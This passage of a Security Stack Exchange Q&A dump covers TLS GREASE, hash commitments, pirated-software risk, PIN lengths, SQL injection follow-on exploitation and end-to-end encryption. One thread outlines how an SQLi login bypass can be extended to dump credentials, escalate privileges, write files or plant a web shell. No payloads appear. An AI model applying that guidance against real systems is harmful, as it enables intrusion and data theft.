<p>The crux of how it works is in places where new features/constructs <em>could</em> be added (TLS Extensions, TLS Versions, TLS Ciphers, etc...) have TLS Clients occasionally send random values <em>specified by the GREASE rfc</em> to prompt these middlebox errors more often and bring more attention to fixing them, or even discourage the behavior of dropping packets when unknown values are seen.</p>
<p>My question is about the italic portion above... <strong>since the GREASE RFC <a href=""https://www.rfc-editor.org/rfc/rfc8701.html#name-grease-values"" rel=""nofollow noreferrer"">explicitly lists and reserves the set of GREASE values</a>, middleboxes could be updated to ignore <em>those</em> values, but continue to drop <em>other</em> unknown values</strong> -- effectively putting us back to the initial problem that GREASE was meant to fix.</p>
<p>If GREASE picked values to use at random, but didn't limit the values to a pre-defined list, I could see how it would discourage the middleboxes of the future from dropping packets when seeing unknown values, since they would be &quot;see unknown values&quot; all the time.</p>
<p>But since the &quot;unknown values&quot; are actually <em>known</em> and <em>specified</em> in the RFC... I can't help but think we're just repeating scenario which caused the initial problem.</p>
","3","3","264201","<p>These &quot;middleboxes&quot; are called &quot;routers&quot; and are not involved in TLS connections. Their task is to route packets from one net to the other, so that the destination server can receive them and build connections. Alternatively, the TLS connection could terminate at a load balancer, in which case the load balancer becomes the server.</p>
<blockquote>
<p>What prevents a server from just ignoring GREASE and dropping connections on real unknown exensions?</p>
</blockquote>
<p>Nothing. It's just a really bad way to behave. It's kind of a &quot;worst of both world&quot; situation. The reason GREASE exists, as you state in your question, is to have a known way of finding potentially hard-to-diagnose problems. So it's a good idea to make use of it.</p>
<blockquote>
<p>Why wouldn't GREASE just pick random values?</p>
</blockquote>
<p>Because that could interfere with future TLS extensions. Imagine some future extension uses the ID <code>0xCAFE</code> to identify itself, signalling that the client supports the CAFE extension. If GREASE were to use 0xCAFE randomly, then GREASE stops being a tool to test how endpoints react to <strong>unknown</strong> extensions, and instead becomes a fuzz testing tool how endpoints react to any kind of arbitrary input on <strong>known</strong> extensions as well.</p>
<p>This is undesirable, so listing and reserving a set of GREASE extensions and demanding that these <strong>MUST NOT</strong> be treated any differently from unknown extensions, is the best course of action to take here.</p>
<blockquote>
<p>Aren't we just repeating the same mistakes?</p>
</blockquote>
<p>No, the initial mistake was to believe clients will always send extensions known to the endpoint. GREASE is supposed to fix that, by causing clients to randomly send &quot;unknown&quot; extensions.</p>
<p>This already caused lots of bugs to be fixed, which is good for everyone. Treating GREASE extensions in a special way means opting out of free bug testing, which is not in any way desirable.</p>
","1"
"264198","264198","TLS 1.3 - GREASE - What if Middleboxes are updated to simply ignore GREASE values? Doesn't the problem GREASE is trying to fix still exist?","<p>Various ambiguous &quot;middleboxes&quot; exist at arbitrary points throughout the Internet between a Client and Server's TLS connection.</p>
<p>A possible intent of these middleboxes is to enforce protocol standards, which sounds great in theory but hinders quick adoption when updating to new versions of a protocol -- as is what happened during the migration to TLS 1.3 from TLS 1.2 and prior.</p>
<p>A solution (well, deterrent) to this happening again in the future is the <strong>GREASE</strong> protocol specified by <a href=""https://www.rfc-editor.org/rfc/rfc8701.html"" rel=""nofollow noreferrer"">RFC 8701</a> (Applying <strong>G</strong>enerate <strong>R</strong>andom <strong>E</strong>xtensions <strong>A</strong>nd <strong>S</strong>ustain <strong>E</strong>xtensibility TLS Extensibility).</p>
<p>The crux of how it works is in places where new features/constructs <em>could</em> be added (TLS Extensions, TLS Versions, TLS Ciphers, etc...) have TLS Clients occasionally send random values <em>specified by the GREASE rfc</em> to prompt these middlebox errors more often and bring more attention to fixing them, or even discourage the behavior of dropping packets when unknown values are seen.</p>
<p>My question is about the italic portion above... <strong>since the GREASE RFC <a href=""https://www.rfc-editor.org/rfc/rfc8701.html#name-grease-values"" rel=""nofollow noreferrer"">explicitly lists and reserves the set of GREASE values</a>, middleboxes could be updated to ignore <em>those</em> values, but continue to drop <em>other</em> unknown values</strong> -- effectively putting us back to the initial problem that GREASE was meant to fix.</p>
<p>If GREASE picked values to use at random, but didn't limit the values to a pre-defined list, I could see how it would discourage the middleboxes of the future from dropping packets when seeing unknown values, since they would be &quot;see unknown values&quot; all the time.</p>
<p>But since the &quot;unknown values&quot; are actually <em>known</em> and <em>specified</em> in the RFC... I can't help but think we're just repeating scenario which caused the initial problem.</p>
","3","3","264203","<blockquote>
<p>Various ambiguous &quot;middleboxes&quot; exist at arbitrary points throughout the Internet between a Client and Server's TLS connection.</p>
</blockquote>
<p>I'm assuming that you are referring to SSL intercepting proxies in companies and SSL terminating load balancers here.</p>
<blockquote>
<p>A possible intent of these middleboxes is to enforce protocol standards, which sounds great in theory but hinders quick adoption when updating to new versions of a protocol -- as is what happened during the migration to TLS 1.3 from TLS 1.2 and prior.</p>
</blockquote>
<p>If the intent was to enforce protocol standards, then this intend failed due to non-conformance of these boxes to protocol standards, i.e. the very point GREASE is trying to early detect. The extensibility with new ciphers, signature algorithms, protocol versions and extensions are part of the TLS protocol already and failing to handle this gracefully means not following the protocol standards.</p>
<p>Note that such SSL intercepting middleboxes are the endpoints of the TLS connection. Thus they don't need to enforce specific protocols apart from maybe enforcing minimal security requirements for protocol version or cipher strength. Anything which they don't understand could be simply ignored, as defined by the TLS standard.</p>
<p>In reality these problems are typically not caused by the intend to enforce a standard, but by making assumptions on how the standards are used and by making implementation shortcuts and performance optimizations which are possible within these assumptions. In practice this resulted in making <a href=""https://support.f5.com/csp/article/K14758"" rel=""nofollow noreferrer"">wrong assumptions about the size of the ClientHello</a> or the <a href=""https://www.mail-archive.com/postfix-users@postfix.org/msg57455.html"" rel=""nofollow noreferrer"">inability to simply ignore unsupported TLS extensions</a>.</p>
<blockquote>
<p>... middleboxes could be updated to ignore those values, but continue to drop other unknown values -- effectively putting us back to the initial problem that GREASE was meant to fix.</p>
</blockquote>
<p>In theory this could be done. In practice though this not only means to neglect the extensibility of TLS as done before, but to explicitly deny extensibility. These middleboxes are not primarily there to prevent connectivity though, but to control connectivity and at the end allow most of it. Thus being aware of the extensibility and explicitly denying it is not in the interest of the users and customers of such middleboxes and will result in costly support and bugfixes. Therefore it is less likely that vendors will simply work around GREASE, but more likely that GREASE will early detect wrong assumptions - i.e. what it was intended for.</p>
","1"
"264198","264198","TLS 1.3 - GREASE - What if Middleboxes are updated to simply ignore GREASE values? Doesn't the problem GREASE is trying to fix still exist?","<p>Various ambiguous &quot;middleboxes&quot; exist at arbitrary points throughout the Internet between a Client and Server's TLS connection.</p>
<p>A possible intent of these middleboxes is to enforce protocol standards, which sounds great in theory but hinders quick adoption when updating to new versions of a protocol -- as is what happened during the migration to TLS 1.3 from TLS 1.2 and prior.</p>
<p>A solution (well, deterrent) to this happening again in the future is the <strong>GREASE</strong> protocol specified by <a href=""https://www.rfc-editor.org/rfc/rfc8701.html"" rel=""nofollow noreferrer"">RFC 8701</a> (Applying <strong>G</strong>enerate <strong>R</strong>andom <strong>E</strong>xtensions <strong>A</strong>nd <strong>S</strong>ustain <strong>E</strong>xtensibility TLS Extensibility).</p>
<p>The crux of how it works is in places where new features/constructs <em>could</em> be added (TLS Extensions, TLS Versions, TLS Ciphers, etc...) have TLS Clients occasionally send random values <em>specified by the GREASE rfc</em> to prompt these middlebox errors more often and bring more attention to fixing them, or even discourage the behavior of dropping packets when unknown values are seen.</p>
<p>My question is about the italic portion above... <strong>since the GREASE RFC <a href=""https://www.rfc-editor.org/rfc/rfc8701.html#name-grease-values"" rel=""nofollow noreferrer"">explicitly lists and reserves the set of GREASE values</a>, middleboxes could be updated to ignore <em>those</em> values, but continue to drop <em>other</em> unknown values</strong> -- effectively putting us back to the initial problem that GREASE was meant to fix.</p>
<p>If GREASE picked values to use at random, but didn't limit the values to a pre-defined list, I could see how it would discourage the middleboxes of the future from dropping packets when seeing unknown values, since they would be &quot;see unknown values&quot; all the time.</p>
<p>But since the &quot;unknown values&quot; are actually <em>known</em> and <em>specified</em> in the RFC... I can't help but think we're just repeating scenario which caused the initial problem.</p>
","3","3","264208","<p>You wrote:</p>
<blockquote>
<p>middleboxes could be updated to ignore those values, but continue to drop other unknown values</p>
</blockquote>
<p>That's perfectly fine. They can drop whatever VALUES they want, as long as the CONNECTION remains alive.</p>
<p>The <a href=""https://chromestatus.com/feature/6475903378915328"" rel=""nofollow noreferrer"">ChromeStatus page for GREASE</a> (archived <a href=""https://archive.ph/wip/EOUhu"" rel=""nofollow noreferrer"">here</a>) has a very short and good explanation of the whole point of GREASE:</p>
<blockquote>
<p>TLS clients offer lists of 16-bit code points (e.g. cipher suites) that servers select from. To remain extensible, servers must ignore unknown values. However, servers may have bugs and reject unknown values. These servers will interoperate with existing clients, so the mistake may spread unnoticed, breaking extensibility for the whole ecosystem. We will reserve some values to advertise at random, to prevent such mistakes before broken servers are widespread.</p>
</blockquote>
","0"
"264180","264180","What is the name of this concept involving hashes?","<p>I'm looking for the name of a concept that works as follows:</p>
<ol>
<li>I post a hash of a file publically e.g. on Twitter</li>
<li>Whenever needed, I provide the file with the contents that make up the given hash</li>
</ol>
<p>The purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.</p>
<p>Knowing the name will enable me reading more about it.</p>
","19","5","264183","<p>This makes me think about time-stamping service (see <a href=""https://www.rfc-editor.org/rfc/rfc3161"" rel=""noreferrer"">RFC3161</a>).</p>
<blockquote>
<p>A time-stamping service supports assertions of proof that a datum existed before a particular time.</p>
</blockquote>
","20"
"264180","264180","What is the name of this concept involving hashes?","<p>I'm looking for the name of a concept that works as follows:</p>
<ol>
<li>I post a hash of a file publically e.g. on Twitter</li>
<li>Whenever needed, I provide the file with the contents that make up the given hash</li>
</ol>
<p>The purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.</p>
<p>Knowing the name will enable me reading more about it.</p>
","19","5","264195","<p>To me this sounds like a <a href=""https://en.wikipedia.org/wiki/Commitment_scheme"" rel=""noreferrer"">commitment scheme</a>:</p>
<blockquote>
<p>A commitment scheme is a cryptographic primitive that allows one to commit to a chosen value (or chosen statement) while keeping it hidden to others, with the ability to reveal the committed value later</p>
<p>...</p>
<p>Interactions in a commitment scheme take place in two phases:</p>
<ol>
<li>the commit phase during which a value is chosen and committed to</li>
<li>the reveal phase during which the value is revealed by the sender, then the receiver verifies its authenticity</li>
</ol>
</blockquote>
<p>You can see this term being used by several of the answers to <a href=""https://crypto.stackexchange.com/q/101431/71558"">this</a> question, for example.</p>
","34"
"264180","264180","What is the name of this concept involving hashes?","<p>I'm looking for the name of a concept that works as follows:</p>
<ol>
<li>I post a hash of a file publically e.g. on Twitter</li>
<li>Whenever needed, I provide the file with the contents that make up the given hash</li>
</ol>
<p>The purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.</p>
<p>Knowing the name will enable me reading more about it.</p>
","19","5","264196","<p>This idiom is called <a href=""https://www.kalzumeus.com/essays/dropping-hashes/"" rel=""noreferrer"">dropping a hash</a> by Patrick McKenzie, who uses the technique frequently.</p>
","12"
"264180","264180","What is the name of this concept involving hashes?","<p>I'm looking for the name of a concept that works as follows:</p>
<ol>
<li>I post a hash of a file publically e.g. on Twitter</li>
<li>Whenever needed, I provide the file with the contents that make up the given hash</li>
</ol>
<p>The purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.</p>
<p>Knowing the name will enable me reading more about it.</p>
","19","5","264226","<p>This sounds like it could be a “proof of existence” method. Since data inside of a blockchain is verifiable using the the uniqueness characteristics of hash functions, over time, many users of the Bitcoin Blockchain have <a href=""https://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html"" rel=""nofollow noreferrer"">embedded all sorts of messages and content</a> directly inside the blockchain, often times in order to prove the existence of something in a decentralized and censorship-proof way.</p>
","0"
"264180","264180","What is the name of this concept involving hashes?","<p>I'm looking for the name of a concept that works as follows:</p>
<ol>
<li>I post a hash of a file publically e.g. on Twitter</li>
<li>Whenever needed, I provide the file with the contents that make up the given hash</li>
</ol>
<p>The purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.</p>
<p>Knowing the name will enable me reading more about it.</p>
","19","5","264230","<p>another option thats similar to the situation you describe could be the idea of a &quot;<a href=""https://en.wikipedia.org/wiki/Zero-knowledge_proof"" rel=""nofollow noreferrer"">zero knowledge proof</a>&quot;. These are essentially ways to prove to someone else that you know something without revealing the contents of what you know. in your example you eventually do reveal the contents so im no</p>
","1"
"264037","264037","Is it safe to use pirated software if AVs don't detect anything malicious about it?","<p>I want to know whether it's safe to use a pirated software if during all of the processes including (downloading, running installer, installing, using and scanning installed files) the system's antivirus/antimalware doesn't detect anything, not even after performing a full system scan?</p>
<p>OS is Windows 11.</p>
<p>I know it's not obviously &quot;legally safe&quot; to use pirated software, but what I'm precisely asking is it safe in terms of ransomware, data theft, getting malware etc.</p>
","0","3","264040","<p>In general antivirus is not able to catch every malware, but it strives to get a good trade-off between high detection rate of malware and low false positive rate (innocent software detected as malicious). This trade-off results especially in higher detection failures for new, unusual or rare malware.</p>
<p>In particular this also means that it will not be able to catch every compromised pirated software.</p>
","5"
"264037","264037","Is it safe to use pirated software if AVs don't detect anything malicious about it?","<p>I want to know whether it's safe to use a pirated software if during all of the processes including (downloading, running installer, installing, using and scanning installed files) the system's antivirus/antimalware doesn't detect anything, not even after performing a full system scan?</p>
<p>OS is Windows 11.</p>
<p>I know it's not obviously &quot;legally safe&quot; to use pirated software, but what I'm precisely asking is it safe in terms of ransomware, data theft, getting malware etc.</p>
","0","3","264062","<p>Most likely a Malware risk as others say, but just to provide a new answer, it could be modified software to keep ports open to make it easier to hack your machine. Some people will accept open port requests from their firewall, without even questioning why the software is asking for access. It is not safe.</p>
","0"
"264037","264037","Is it safe to use pirated software if AVs don't detect anything malicious about it?","<p>I want to know whether it's safe to use a pirated software if during all of the processes including (downloading, running installer, installing, using and scanning installed files) the system's antivirus/antimalware doesn't detect anything, not even after performing a full system scan?</p>
<p>OS is Windows 11.</p>
<p>I know it's not obviously &quot;legally safe&quot; to use pirated software, but what I'm precisely asking is it safe in terms of ransomware, data theft, getting malware etc.</p>
","0","3","264412","<p>As a general rule, never use pirated software. Pirated software is often bundled with malware or backdoored and presents a massive security risk. Here are a few things to consider:</p>
<ol>
<li><p>Anti-virus scanners can't always detect malware 100% of the time. There are so many different new strains and there are various ways of evading AV so you can't always trust an AV scan.</p>
</li>
<li><p>A lot of AV scanners won't scan large files that are 1GB+ so it may just check the header of the document or checksum etc.</p>
</li>
<li><p>You mentioned about doing a full system scan, if you have already installed the software then this is kind of pointless. There are various types of malware out there that will hide themselves or disable AV after install to prevent them from being removed.</p>
</li>
</ol>
","0"
"263911","263911","Why are PIN codes usually of even length (4 or 6)?","<p>A huge problem is <a href=""https://www.schneier.com/blog/archives/2012/02/1234_and_birthd.html"" rel=""noreferrer"">PIN guessing from birthdays</a> (dd/mm/yy lends to a 6 digit number that is easily guessed, dd/mm/yyyy for 8 digits). It's very often that a PIN number is taken from someone's birthday or year, either their own or relatives. There was even a case where <a href=""https://www.welivesecurity.com/2019/06/19/change-birthday-hackers-may-know-pin/"" rel=""noreferrer"">a speaker had cracked the phone code of an audience live on-stage</a>.</p>
<p>An odd-numbered PIN length seems like it would solve this (5-digits, for instance): even if the first two digits are mm/dd or dd/mm, now the user has to choose the last digit instead of just putting it as the two last digits of their birth year mindlessly. It might even discourage putting any kind of dates as a PIN and prompt them to choose a more random set of 5-digit numbers.</p>
<p>So my question: why are even-numbered PIN lengths the norm? Why 4 or 6 digits, why not 5 or 7 where they're much less tethered to how we write dates or years overall?</p>
","30","3","263921","<p>Great question!  It got me thinking, which gets me researching.</p>
<p>I am theorizing that it's not an even vs. odd count as much as the recognized standard for PIN's (ISO 9564) states they should be between four and twelve digits long and recommended using four digits. I.e. that's why the four digit pin is so widely used.  Then there are certain country financial institutions (Switzerland for example) that require six digit pins.  Also, it's noted in the Wikipedia article that the ISO standard suggests issuing pins no longer than six digits.  I believe recommendation of four digits and mandate of six digits by some institutions are why five digit pins are not as popular.</p>
<p>An analysis by DataGenetics on <em>released/exposed/discovered</em> password tables showed that four and six character pins are the most popular but all sizes of four or larger are used.  From this analysis, it found that the most common five digit PIN (12345) in the sample appeared 22.802% of the time!  That's about two times more than the most common four or six digit pin (1234 (10.713%) and 123456 (11.684%) respectively).  I agree that using a five digit PIN to prevent using dates etc. is wise but in the US, postal zip codes are five digits and I could see people using them.  Also, everyone with a single digit month birthday/anniversary etc. could easily use a <code>mddyy</code> PIN.  The other interesting finding is the larger the PIN is, the more likely repetitive patterns begin to occur like 1234321 or 1212123.  Key take away, the longer the pin the more humans will require a mnemonic to remember them.</p>
<p><strong>References</strong><br />
<a href=""https://en.wikipedia.org/wiki/ISO_9564"" rel=""noreferrer"">ISO 9564</a><br />
<a href=""https://en.wikipedia.org/wiki/Personal_identification_number#PIN_length"" rel=""noreferrer"">Pin Length</a><br />
<a href=""https://www.datagenetics.com/blog/september32012/"" rel=""noreferrer"">DataGenetics PIN Analysis</a></p>
","26"
"263911","263911","Why are PIN codes usually of even length (4 or 6)?","<p>A huge problem is <a href=""https://www.schneier.com/blog/archives/2012/02/1234_and_birthd.html"" rel=""noreferrer"">PIN guessing from birthdays</a> (dd/mm/yy lends to a 6 digit number that is easily guessed, dd/mm/yyyy for 8 digits). It's very often that a PIN number is taken from someone's birthday or year, either their own or relatives. There was even a case where <a href=""https://www.welivesecurity.com/2019/06/19/change-birthday-hackers-may-know-pin/"" rel=""noreferrer"">a speaker had cracked the phone code of an audience live on-stage</a>.</p>
<p>An odd-numbered PIN length seems like it would solve this (5-digits, for instance): even if the first two digits are mm/dd or dd/mm, now the user has to choose the last digit instead of just putting it as the two last digits of their birth year mindlessly. It might even discourage putting any kind of dates as a PIN and prompt them to choose a more random set of 5-digit numbers.</p>
<p>So my question: why are even-numbered PIN lengths the norm? Why 4 or 6 digits, why not 5 or 7 where they're much less tethered to how we write dates or years overall?</p>
","30","3","263924","<p><strong>PIN code lengths of five, seven, or eight+ digits are indeed good because they're nonstandard, which will combat PIN recycling.</strong> Any other justification seems to fall short.</p>
<p>PINs <strong>should</strong> always be implemented with a limited number of attempts allowed, banning automated PIN entry. The iPhone, for example, can be configured to wipe itself if you fail to enter your PIN ten times between unlocks. Banks will lock your account after a certain number of attempts. This isn't always the case, but I consider it necessary to counteract the ridiculously weak security PINs provide.</p>
<p>We're talking about trivial offline or automated cracking:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th>digits</th>
<th>combos</th>
<th>entropy</th>
<th>crack time</th>
</tr>
</thead>
<tbody>
<tr>
<td>4</td>
<td>10k</td>
<td>13</td>
<td>0s</td>
</tr>
<tr>
<td>5</td>
<td>100k</td>
<td>16</td>
<td>0s</td>
</tr>
<tr>
<td>6</td>
<td>1m</td>
<td>20</td>
<td>2s</td>
</tr>
<tr>
<td>7</td>
<td>10m</td>
<td>23</td>
<td>17s</td>
</tr>
<tr>
<td>8</td>
<td>100m</td>
<td>26</td>
<td>3m</td>
</tr>
<tr>
<td>9</td>
<td>1b</td>
<td>30</td>
<td>28m</td>
</tr>
<tr>
<td>10</td>
<td>10b</td>
<td>33</td>
<td>5h</td>
</tr>
<tr>
<td>11</td>
<td>100b</td>
<td>36</td>
<td>2d</td>
</tr>
</tbody>
</table>
</div>
<p>For a properly secure digital code, you'd need 14 digits for an offline crack time to exceed a year, and that's assuming something robust like PBKDF2 (this chart assumes PBKDF2 with a speed of <a href=""https://blog.1password.com/1password-hashcat-strong-master-passwords/"" rel=""nofollow noreferrer"" title=""Source: 1Password research from 2013"">300k guesses/sec</a>) rather than the <em>vastly</em> more likely plaintext code storage.</p>
<p>To this question's point, making it harder to map codes is better, as <a href=""https://twitter.com/adamhotep/status/1234631623322324993"" rel=""nofollow noreferrer"">people so often conflate &quot;random&quot;, &quot;arbitrary&quot;, and &quot;obscure&quot;</a>, then fail spectacularly at estimating what is or is not obscure.</p>
<p>PINs with five or seven digits may avoid current patterns with four or six digits, but as <a href=""https://security.stackexchange.com/a/263921/42391"">kenlukas's answer</a> points out, this will simply shift what people choose in their bad attempts at obscurity, such as <a href=""https://kb.bullseyelocations.com/article/93-postal-code-formats"" rel=""nofollow noreferrer"">postal codes</a> or dates. There are 75% odds of a date that fits <code>mddyy</code> (or <code>ddmyy</code>) since there are only three months that miss (365 minus the days in October, November, and December is 273, 273/365 = 75%). Increase that to allow <code>mmdyy</code>/<code>dmmyy</code> and single-digit years between 2000-2009 and it gets worse.</p>
<p>An attacker can guess a ZIP code, for example, by using its ordered structure; if you're from a rural state or large metropolitan area, your ZIP code can be guessed in a few guesses because all codes in the area are similar. ZIP codes are therefore extremely insecure. At least with a <code>mmdd</code> code, there are 365.25 possibilities, though attackers will start with your and your loved ones' birthdays and anniversaries.</p>
<p>For dates, a six-digit code's 1000000 possibilities get reduced to 36525 and a birthdate can be narrowed to 1826 assuming you can guess the person's age within a five year span. (Five digit variations actually <em>introduce</em> complexity here, but it's not much.)</p>
<p>Seven-digit PINs will bring in the possibility of childhood phone numbers, which are at least harder for an attacker to socially engineer (especially for retired numbers).</p>
<p>Still, more is always better, so moving a requirement from four to five is great, but you might as well go to six. Aspire to longer codes barring compatibility concerns (I remember a conversation in 2002 in which a friend couldn't use their bank card in Europe because that bank didn't support six-digit PINs).</p>
<p>I'm hoping PINs fade away thanks to 2FA solutions like <a href=""https://en.wikipedia.org/wiki/Time-based_one-time_password"" rel=""nofollow noreferrer"" title=""Time-based one-time password"">TOTP</a> and <a href=""https://en.wikipedia.org/wiki/HMAC-based_one-time_password_algorithm"" rel=""nofollow noreferrer"" title=""HMAC-based one-time password"">HOTP</a>, but I expect that transition to be slow and legacy support will continue for another decade or two.</p>
","7"
"263911","263911","Why are PIN codes usually of even length (4 or 6)?","<p>A huge problem is <a href=""https://www.schneier.com/blog/archives/2012/02/1234_and_birthd.html"" rel=""noreferrer"">PIN guessing from birthdays</a> (dd/mm/yy lends to a 6 digit number that is easily guessed, dd/mm/yyyy for 8 digits). It's very often that a PIN number is taken from someone's birthday or year, either their own or relatives. There was even a case where <a href=""https://www.welivesecurity.com/2019/06/19/change-birthday-hackers-may-know-pin/"" rel=""noreferrer"">a speaker had cracked the phone code of an audience live on-stage</a>.</p>
<p>An odd-numbered PIN length seems like it would solve this (5-digits, for instance): even if the first two digits are mm/dd or dd/mm, now the user has to choose the last digit instead of just putting it as the two last digits of their birth year mindlessly. It might even discourage putting any kind of dates as a PIN and prompt them to choose a more random set of 5-digit numbers.</p>
<p>So my question: why are even-numbered PIN lengths the norm? Why 4 or 6 digits, why not 5 or 7 where they're much less tethered to how we write dates or years overall?</p>
","30","3","263933","<p>In the financial world, <a href=""https://en.wikipedia.org/wiki/Binary-coded_decimal"" rel=""noreferrer"">Binary-Coded Decimal</a> is a popular number-storage format, since most major world currencies are divided into 100 cents, and BCD allows these to be stored as exact decimal numbers, versus binary floating-point where <code>0.01</code> is approximated as 0.00999999977648258209228515625 (in single-precision).  BCD naturally organizes digits into pairs, and hence <em>might</em> explain the preference towards even numbers of digits.</p>
<p>Less speculative is why <a href=""https://www.scienceabc.com/eyeopeners/why-are-atm-card-pins-usually-just-4-digit-long.html"" rel=""noreferrer"">4-digit PINs</a> are particularly popular: You can thank (or blame) the ATM's inventor John Shepherd-Barron, and his wife's poor memory.</p>
<blockquote>
<p>Initially, Barron also proposed 6-digit PINs, but when he tested this system on his wife, Caroline, she told him that the longest string of numbers that she could remember was 4. Consequently, he switched from 6-digit PINs to 4-digit ones, and ATMs became more popular. It wasn’t long before 4-digit PINs became the world standard.</p>
</blockquote>
","13"
"263876","263876","Can you exploit an SQLi authentication bypass for anything else?","<p>I have manually confirmed an SQLi authentication bypass in a user login portal. The payload itself is quite simple. Can this vulnerability be used to do anything else such as enumerate users or inject a web shell?</p>
","1","3","263879","<p>The short answer is yes you might be able to dump the whole database including users and even write to disk and upload a webshell.</p>
<p>Some good resources:</p>
<ul>
<li><a href=""https://portswigger.net/web-security/sql-injection"" rel=""nofollow noreferrer"">https://portswigger.net/web-security/sql-injection</a></li>
<li><a href=""https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"" rel=""nofollow noreferrer"">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
<li><a href=""https://book.hacktricks.xyz/pentesting-web/sql-injection"" rel=""nofollow noreferrer"">https://book.hacktricks.xyz/pentesting-web/sql-injection</a></li>
<li><a href=""https://github.com/sqlmapproject/sqlmap"" rel=""nofollow noreferrer"">https://github.com/sqlmapproject/sqlmap</a></li>
</ul>
","-1"
"263876","263876","Can you exploit an SQLi authentication bypass for anything else?","<p>I have manually confirmed an SQLi authentication bypass in a user login portal. The payload itself is quite simple. Can this vulnerability be used to do anything else such as enumerate users or inject a web shell?</p>
","1","3","263884","<blockquote>
<p>Can this vulnerability be used to do anything else such as enumerate users or inject a web shell?</p>
</blockquote>
<p>Maybe, maybe not. Once you bypassed authentication using SQLi you can do what the impersonated user can do - no additional SQLi needed. But if the specific attack vector you've used for authentication bypass can also be used for other attacks depends on the exact vulnerability, the database design, the execution environment ...</p>
","-1"
"263876","263876","Can you exploit an SQLi authentication bypass for anything else?","<p>I have manually confirmed an SQLi authentication bypass in a user login portal. The payload itself is quite simple. Can this vulnerability be used to do anything else such as enumerate users or inject a web shell?</p>
","1","3","263949","<p>Probably. It depends on the application (and what input it allows and/or filters), the existence of a WAF, the query you are injecting into, the DBMS used, the configuration/permissions of the DBMS, etc.</p>
<p>In most situations, you should be able to perform a <a href=""https://owasp.org/www-community/attacks/Blind_SQL_Injection"" rel=""nofollow noreferrer"">blind SQL injection</a> to extract information from the database. That's because most often, you will be injecting into the <code>WHERE</code> statement of a <code>SELECT</code> query. This will likely allow you to extract user password (hashes) and the like (this may include passwords for other logins/apps than the one you are bypassing the authentication for).</p>
<p>You might be able to execute INSERT/UPDATE statements, depending on the DBMS (eg via stacked queries). Writing data can be useful (you could escalate privileges to admin, add a new admin user, or exploit vulnerabilities that are only exploitable from the database (sometimes RCE is possible when directly controlling database values)).</p>
<p>You might be able to <a href=""https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#oracle"" rel=""nofollow noreferrer"">read/write files</a> (writing files might lead to RCE) or <a href=""https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql"" rel=""nofollow noreferrer"">execute commands</a>. Options to do so would be stacked queries (executing multiple queries separated via <code>;</code>), subqueries, etc. A properly configured server would probably not allow reading/writing files or executing commands, but it's always worth a try.</p>
","0"
"263846","263846","End-to-end encryption with multiple recipients?","<p>As far as I understand, end-to-end encryption is used to encrypt the content on the client (sender), send it to the server and decrypt it on the client (recipient). The clients store their private keys on the device and the Server stores the public keys for the encryption.</p>
<p>My idea:
Request the public keys from the server, encrypt the data, send it to the Server and store it in a database. The client loads the content from the database and encrypts it with the device.</p>
<p>In my scenario I would like to have x Android tablets which should read the content. So there are multiple recipients.</p>
<p>Does end-to-end encryption make sense? How should I share the private key and should it be shared? I thought about scanning a QR code from a central device. And what happens if the user installs the app and loses the private key? Will the encrypted data be lost? And is there a way to prevent this situation?</p>
","1","4","263847","<blockquote>
<p>Does end-to-end encryption make sense?</p>
</blockquote>
<p>Sure</p>
<blockquote>
<p>How should I share the private key and should it be shared?</p>
</blockquote>
<p>How is up to you but it would need to be shared or the plain text encrypted separately for every device.</p>
<blockquote>
<p>And what happens if the user installs the app and loses the private key? Will the encrypted data be lost?</p>
</blockquote>
<p>Yes, it will be lost.  If one cares about end to end encryption this is exactly what one should want.</p>
<blockquote>
<p>And is there a way to prevent this situation?</p>
</blockquote>
<p>The private portion of the key could be stored on the server encrypted and the user knows something which decrypts it.  For example, using PBKDF, which turns a password into a symmetric key.  It's secrets all the way down though, if they forget their password then that's it.</p>
","0"
"263846","263846","End-to-end encryption with multiple recipients?","<p>As far as I understand, end-to-end encryption is used to encrypt the content on the client (sender), send it to the server and decrypt it on the client (recipient). The clients store their private keys on the device and the Server stores the public keys for the encryption.</p>
<p>My idea:
Request the public keys from the server, encrypt the data, send it to the Server and store it in a database. The client loads the content from the database and encrypts it with the device.</p>
<p>In my scenario I would like to have x Android tablets which should read the content. So there are multiple recipients.</p>
<p>Does end-to-end encryption make sense? How should I share the private key and should it be shared? I thought about scanning a QR code from a central device. And what happens if the user installs the app and loses the private key? Will the encrypted data be lost? And is there a way to prevent this situation?</p>
","1","4","263848","<blockquote>
<p>My idea: Request the public keys from the server, encrypt the data, send it to the Server and store it in a database. The client loads the content from the database and encrypts it with the device.</p>
</blockquote>
<p>If the server simply provides the public keys of a specific client to other clients - how does the client know that this is the correct key? A malicious server might just return a key owned by the server instead of the real users key. Then receive the message, decrypt it (since it has its own key) and encrypt it again for the real recipient (since it has the recipients key too).</p>
<p>It is better to provide a way for users to share the public keys without trusting a potentially malicious or compromised server. This might be done by sharing keys using existing secure and trusted channels or by validating retrieved keys using trust structures like <a href=""https://en.wikipedia.org/wiki/Public_key_infrastructure"" rel=""nofollow noreferrer"">Public key infrastructure</a> or <a href=""https://en.wikipedia.org/wiki/Web_of_trust"" rel=""nofollow noreferrer"">Web of Trust</a>.</p>
<blockquote>
<p>How should I share the private key and should it be shared? I thought about scanning a QR code from a central device.</p>
</blockquote>
<p>It is in general not a good idea to share a private key. But if all devices belong to you and you and only you have full control over it, then it might be ok. Note that you need to consider the case that you loose control over a device and thus the attacker might now have the private key, and has thus access to all previous messages encrypted with the matching public key. <a href=""https://en.wikipedia.org/wiki/Forward_secrecy#Non-interactive_forward_secrecy"" rel=""nofollow noreferrer"">Forward secrecy</a> helps to limit the impact of a compromised key.</p>
<blockquote>
<p>And what happens if the user installs the app and loses the private key? Will the encrypted data be lost?</p>
</blockquote>
<p>The encrypted data are not lost. But they cannot be decrypted anymore.</p>
<blockquote>
<p>And is there a way to prevent this situation?</p>
</blockquote>
